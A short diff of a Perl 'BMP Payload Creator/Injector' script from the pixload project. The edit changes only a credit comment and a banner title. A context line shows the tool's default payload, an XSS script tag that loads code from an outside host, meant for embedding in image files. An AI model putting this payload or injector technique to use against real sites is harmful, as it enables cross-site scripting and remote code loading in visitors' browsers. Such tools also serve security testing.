@@ -2,7 +2,7 @@
 #
 # BMP Payload Creator/Injector
 # coded by chinarulezzz, alexandr.savca89@gmail.com
-# congrats to Osanda Malith Jayathissa
+# credits to Osanda Malith Jayathissa
 #
 # See LICENSE file for copyright and license details.
 #
@@ -30,7 +30,7 @@ usage(1) unless $outfile;
 $payload //= '<script src//nji.xyz></script>';
 
 say <<EOF;
-[>|        JPEG Tags ~ Payload Creator      |<]
+[>|       BMP Payload Creator/Injector      |<]
 
     https://github.com/chinarulezzz/pixload
 
